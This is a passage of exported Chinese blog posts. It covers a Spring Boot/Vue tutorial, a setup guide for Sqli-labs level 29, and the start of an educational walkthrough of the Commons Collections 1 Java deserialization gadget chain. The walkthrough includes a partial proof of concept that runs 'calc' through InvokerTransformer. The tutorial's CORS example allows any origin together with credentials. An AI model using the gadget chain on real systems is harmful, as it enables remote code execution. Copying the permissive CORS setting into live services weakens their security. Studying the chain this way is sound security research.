<p><strong>URL:</strong><code>127.0.0.1:8080/testRequestParam?id=1&amp;name=shulei&amp;likes=xuexi&amp;likes=xitou</code></p>
<h2 id="相关注解其他属性"><a href="#相关注解其他属性" class="headerlink" title="相关注解其他属性"></a>相关注解其他属性</h2><h3 id="required"><a href="#required" class="headerlink" title="required"></a>required</h3><p>代表是否必须，默认值为<code>true</code>也就是必须要有对应的参数。如果没有就会报错。<br>如果对应的参数可传可不传则可以把去设置为<code>false</code><br>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;,required = false)</span> String name)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="defaultValue"><a href="#defaultValue" class="headerlink" title="defaultValue"></a>defaultValue</h3><p>如果对应的参数没有，我们可以用<code>defaultValue</code>属性设置默认值。<br>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;,required = false,defaultValue = &quot;aaa&quot;)</span> String name)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查询用户接口"><a href="#查询用户接口" class="headerlink" title="查询用户接口"></a>查询用户接口</h2><p><code>Controller-&gt;service(interface)-&gt;mapper(interface)-&gt;resources/mapper.xml</code></p>
<p><code>service(interface)&lt;-serviceImp</code></p>
<h2 id="接口相应格式"><a href="#接口相应格式" class="headerlink" title="接口相应格式"></a>接口相应格式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*用这个class来封装数据*/</span></span><br><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseResult</span>&lt;T&gt; &#123;<span class="comment">//泛型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;<span class="comment">//状态码</span></span><br><span class="line">    <span class="keyword">private</span> String msg;<span class="comment">//提示信息</span></span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMsg</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(T data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResponseResult</span><span class="params">(<span class="type">int</span> code,String msg)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.code=code;</span><br><span class="line">        <span class="built_in">this</span>.msg=msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResponseResult</span><span class="params">(<span class="type">int</span> code,T data)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.code=code;</span><br><span class="line">        <span class="built_in">this</span>.data=data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="前端发送请求"><a href="#前端发送请求" class="headerlink" title="前端发送请求"></a>前端发送请求</h2><p>我们需要用到<a href="http://axios-js.com/docs/">Axios</a>和<a href="https://cn.vuejs.org/v2/guide/">Vue.js</a></p>
<p>在<code>html</code>中添加如下代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- development version, includes helpful console warnings --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">created</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="variable language_">this</span>.<span class="title function_">fetchAllUsers</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">fetchAllUsers</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//请求后台接口，把接收到的数据在页面中展示</span></span></span><br><span class="line"><span class="language-javascript">            axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8666/user/findAll&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h2><h3 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h3><p>在使用<code>XMLHttpRequest</code>对象发送<code>HTTP</code>请求的时候，必须遵循同源策略</p>
<h3 id="CORS解决跨域"><a href="#CORS解决跨域" class="headerlink" title="CORS解决跨域"></a>CORS解决跨域</h3><p>CORS是<code>Cross-origin resource sharing</code>的全称，允许浏览器跨源发送<code>XMLHttpRequest</code>请求，从而克服AJAX只能同源使用的限制。</p>
<p>它通过服务器增加一个特殊的<code>header(Access-Control-Allow-Origin)</code>来告诉客户端跨域的限制，如果浏览器支持CORS并且判断<code>Orgin</code>通过的话，就会允许<code>XMLHttpRequest</code>发起跨域请求。</p>
<h3 id="Springboot使用CORS解决跨域请求"><a href="#Springboot使用CORS解决跨域请求" class="headerlink" title="Springboot使用CORS解决跨域请求"></a>Springboot使用CORS解决跨域请求</h3><h4 id="方法一：-CrossOrigin"><a href="#方法一：-CrossOrigin" class="headerlink" title="方法一：@CrossOrigin"></a>方法一：@CrossOrigin</h4><p>直接在想要跨域请求的<code>method</code>或者<code>Class</code>上加<code>@CrossOrigin</code></p>
<p>但是这个方法有缺陷，会添加很多注释</p>
<h4 id="方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor"><a href="#方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor" class="headerlink" title="方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor"></a>方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CorsConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span>&#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)<span class="comment">//允许访问的路径</span></span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)<span class="comment">//允许的域名</span></span><br><span class="line">                .allowCredentials(<span class="literal">true</span>)<span class="comment">//cookie</span></span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;DELETE&quot;</span>,<span class="string">&quot;PUT&quot;</span>)<span class="comment">//允许的请求方法</span></span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>)<span class="comment">//允许的请求头</span></span><br><span class="line">                .maxAge(<span class="number">3600</span>);<span class="comment">//允许时间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="前端渲染"><a href="#前端渲染" class="headerlink" title="前端渲染"></a>前端渲染</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- development version, includes helpful console warnings --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="attr">users</span>:[]</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">created</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="variable language_">this</span>.<span class="title function_">fetchAllUsers</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">fetchAllUsers</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//请求后台接口，把接收到的数据在页面中展示</span></span></span><br><span class="line"><span class="language-javascript">            axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8666/user/findAll&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">if</span>(res.<span class="property">data</span>.<span class="property">code</span>==<span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">this</span>.<span class="property">users</span>=res.<span class="property">data</span>.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;table-responsive&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-striped table-bordered table-hover&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>学号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>地址<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">tr</span> <span class="attr">v-for</span>=<span class="string">&quot;user in users&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.id&#125;&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.username&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.age&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.address&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程</p>
]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli labs第29关tomcat+java环境搭建排坑</title>
    <url>/2021/07/07/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/</url>
    <content><![CDATA[<h1 id="Sqli-labs第29关环境搭建"><a href="#Sqli-labs第29关环境搭建" class="headerlink" title="Sqli labs第29关环境搭建"></a>Sqli labs第29关环境搭建</h1><h2 id="搭建原因"><a href="#搭建原因" class="headerlink" title="搭建原因"></a>搭建原因</h2><p><img src="/image/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/image-20210707140528351.png" alt="image-20210707140528351"></p>
<p>通过上面的图，我们其实可以知道，29-32这几关其实是有一个<code>tomcat(jsp)</code>这层作为一个waf，相当于一个中介，你最后操作的对象其实是在<code>php</code>环境上，而我们要在这种环境下练习我们的sql注入技巧，所以我们需要搭建相关环境<code>（tomcat 服务器、jdk、mysql-connector-java.）</code>。</p>
<span id="more"></span>

<h2 id="搭建步骤-排坑"><a href="#搭建步骤-排坑" class="headerlink" title="搭建步骤+排坑"></a>搭建步骤+排坑</h2><p>在做sqli labs第29关的时候，因为环境搭建不上废了大半天，后来网上找了下，其实已经有前辈写出来了<a href="https://blog.csdn.net/qq_43579362/article/details/104298144?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162562221916780366560572%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162562221916780366560572&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-104298144.first_rank_v2_pc_rank_v29&utm_term=sqlilab+tomcat%E6%90%AD%E5%BB%BA&spm=1018.2226.3001.4187">详细的搭建过程</a>，但其中有几点没提到，所以会导致一些错误（而网上这关的搭建教程少之又少），这里记录一下我自己的操作，排下坑。</p>
<p>首先还是按照<a href="https://blog.csdn.net/qq_43579362/article/details/104298144?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162562221916780366560572%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162562221916780366560572&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-104298144.first_rank_v2_pc_rank_v29&utm_term=sqlilab+tomcat%E6%90%AD%E5%BB%BA&spm=1018.2226.3001.4187">详细的搭建过程</a>操作，使用KALI搭建，只是中间需要注意几点</p>
<ul>
<li>mysql处登录是mysql -uroot -p,默认的话密码为空</li>
<li>最后搭建好tomcat后，要修改一下29-32关的代码</li>
</ul>
<p><img src="/image/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/image-20210707140149367.png" alt="image-20210707140149367"></p>
<p>有网址的地方要修改成你搭建的php环境下的网址</p>
<p><img src="/image/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/image-20210707140241593.png" alt="image-20210707140241593"></p>
<p>第32关处注意也要修改数据库信息。</p>
<ul>
<li><strong>最后一个大坑</strong>，我修改好所有东西以后依然访问出错，之前一直以为是配置有问题，废了很多时间，最后重新启动虚拟机，把所有服务都重启了一遍，就正常了。</li>
</ul>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之利用链分析集合(4)</title>
    <url>/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在搞清楚Java反射机制、RMI和基本的Java反序列化漏洞流程后，下一步便是分析Java反序列化漏洞的经典利用链了。但这对大部分人来说都并不容易，我在网上查阅了大量资料，大部分文章对于新手来说并不友好 - 刚开始我甚至搞不清楚测试反序列化漏洞的环境应该如何搭建，在这种情况下，又何谈分析代码。</p>
<p>这篇将集合所有经典的反序列化漏洞利用链的详细讲解（包括一些环境搭建），希望帮助更多人、也包括我自己，能够认识、理解利用链的深层原理。</p>
<blockquote>
<p>Do not become a script kiddie.</p>
</blockquote>
<p>代码同步项目：<a href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a></p>
<span id="more"></span>

<h1 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h1><p><a href="https://leihehehe.github.io/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">见此篇</a></p>
<h1 id="Apache-Commons-Collections-利用链"><a href="#Apache-Commons-Collections-利用链" class="headerlink" title="Apache Commons Collections 利用链"></a>Apache Commons Collections 利用链</h1><h2 id="什么是Commons-Collections"><a href="#什么是Commons-Collections" class="headerlink" title="什么是Commons Collections"></a>什么是Commons Collections</h2><p>有编程基础的同学应该知道，无论是<code>C Language, Java, Python</code>还是其他语言，都有**Library(库)**。在<code>Java</code>中，我们用<code>import</code>引入库，这样我们就可以使用被引入的库中的一些function了。而Apache Commons Collections就是一个第三方基础库。</p>
<blockquote>
<p>It provides several features to make collection handling easy. It provides many new interfaces, implementations and utilities.</p>
</blockquote>
<p>它提供了一些功能，可以更方便的管理Collection集合 - 因为方便，Commons Collections被广泛用于各种Java应用的开发。其中反序列化漏洞就出现在这个库中，这意味着使用<strong>该库的漏洞版本</strong>的Java应用会面临<strong>反序列化漏洞</strong>的威胁。而我们的目的，就是研究这个库是如何产生并被利用反序列化漏洞的。</p>
<h2 id="Commons-Collections-1"><a href="#Commons-Collections-1" class="headerlink" title="Commons Collections 1"></a>Commons Collections 1</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="下载准备"><a href="#下载准备" class="headerlink" title="下载准备"></a>下载准备</h4><ul>
<li><p>IntelliJ IDEA</p>
</li>
<li><p><a href="http://archive.apache.org/dist/commons/collections/binaries/">apache commons collection 3.1版本</a></p>
</li>
<li><p>JDK1.7(8u71前版本)</p>
</li>
</ul>
<h4 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h4><h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h5><p>首先创建一个<strong>Java</strong>项目，JDK记得选1.7版本的。</p>
<p>在<code>File-&gt;Project Structure-&gt;Modules-&gt;Dependencies</code>点右边的加号：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154615757.png" alt="image-20210731154615757"></p>
<p>导入我们下载好的cc jar包</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154659615.png" alt="image-20210731154659615"></p>
<p>配置就完成了。这时候我们可以看到<strong>library</strong>处已被引入。<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731160311855.png" alt="image-20210731160311855"></p>
<p>在Artifacts处也应该导入，具体步骤见<a href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之Ysoserial安装配置</a>中的<strong>WebServer环境搭建</strong>章节。</p>
<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h5><p>也可以通过创建Maven项目，添加如下dependency:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="TransformedMap版本-POC构造过程"><a href="#TransformedMap版本-POC构造过程" class="headerlink" title="TransformedMap版本 - POC构造过程"></a>TransformedMap版本 - POC构造过程</h3><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><p>安全研究的前辈们为我们发现并构造了利用这个漏洞的POC，我们现在就需要分析这条利用链的原理。</p>
<p>我们的利用链需要用到如下的Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>TransformedMap</li>
<li>AnotationInvocationHandler</li>
</ul>
<h4 id="第一步：InvokerTransformer"><a href="#第一步：InvokerTransformer" class="headerlink" title="第一步：InvokerTransformer"></a>第一步：InvokerTransformer</h4><p>在<code>InvokerTransformer</code>中，我们一眼可以看到如下的<strong>反射机制</strong>的使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//此处是关键</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//此处是关键</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//此处是关键</span></span><br><span class="line">            &#125; </span><br><span class="line">            ...<span class="comment">//此处省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在它的<code>transform()</code>方法中，将先get到了<code>input</code>所在的Class，然后，获取Class中的<code>method(this.iMethodName, this.iParamTypes)</code>，再<code>method.invoke(input, this.iArgs)</code>。那么我们是否可以控制这些变量来完成一个反射呢？</p>
<p><code>InvokerTransformer</code>有两个<strong>constructor</strong>，其中一个可以让我们传入以上需要用到的<code>iMethodName,iParamTypes,iArgs</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们就可以利用这个Class来触发RCE了！如果我们想要执行<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>的效果，应该怎么办呢？</p>
<p>把它和上面的<code>transform()</code>里的代码对照，我们将它写成反射的形式:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//input -&gt; Runtime.getRuntme() 这里的Cls-&gt; Runtime.class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="comment">//iMethodName -&gt; exec </span></span><br><span class="line"><span class="comment">//paramTypes -&gt; String.class</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//iArgs -&gt; &quot;calc&quot;</span></span><br></pre></td></tr></table></figure>

<p>一个简易的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span 